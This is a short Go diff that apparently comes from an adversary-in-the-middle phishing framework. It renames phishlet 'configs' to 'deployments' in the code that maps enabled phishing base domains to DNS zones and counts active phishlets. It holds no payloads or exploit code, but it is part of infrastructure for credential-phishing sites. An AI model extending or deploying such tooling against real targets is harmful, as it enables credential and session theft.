@@ -153,16 +153,16 @@ func (ini *initializer) initPhishlets() error {
 // needed by DNSService. This is separate from LoadActiveFromDB so DNS can be
 // initialised before PhishletService is fully wired.
 func (ini *initializer) extractZones(externalIP string) (map[string]aitm.ZoneConfig, error) {
-	configs, err := ini.phishletStore.ListPhishletConfigs()
+	deployments, err := ini.phishletStore.ListPhishletDeployments()
 	if err != nil {
-		return nil, fmt.Errorf("listing phishlet configs: %w", err)
+		return nil, fmt.Errorf("listing phishlet deployments: %w", err)
 	}
 	zones := make(map[string]aitm.ZoneConfig)
-	for _, pcfg := range configs {
-		if pcfg.Enabled && pcfg.BaseDomain != "" && pcfg.DNSProvider != "" {
-			zones[pcfg.BaseDomain] = aitm.ZoneConfig{
-				Zone:         pcfg.BaseDomain,
-				ProviderName: pcfg.DNSProvider,
+	for _, deployment := range deployments {
+		if deployment.Enabled && deployment.BaseDomain != "" && deployment.DNSProvider != "" {
+			zones[deployment.BaseDomain] = aitm.ZoneConfig{
+				Zone:         deployment.BaseDomain,
+				ProviderName: deployment.DNSProvider,
 				ExternalIP:   externalIP,
 			}
 		}
@@ -321,13 +321,13 @@ func (ini *initializer) initWatcher() {
 }
 
 func (ini *initializer) countActive() int {
-	configs, err := ini.Daemon.phishletSvc.ListConfigs()
+	deployments, err := ini.Daemon.phishletSvc.ListDeployments()
 	if err != nil {
 		return 0
 	}
 	n := 0
-	for _, cfg := range configs {
-		if cfg.Enabled {
+	for _, deployment := range deployments {
+		if deployment.Enabled {
 			n++
 		}
 	}
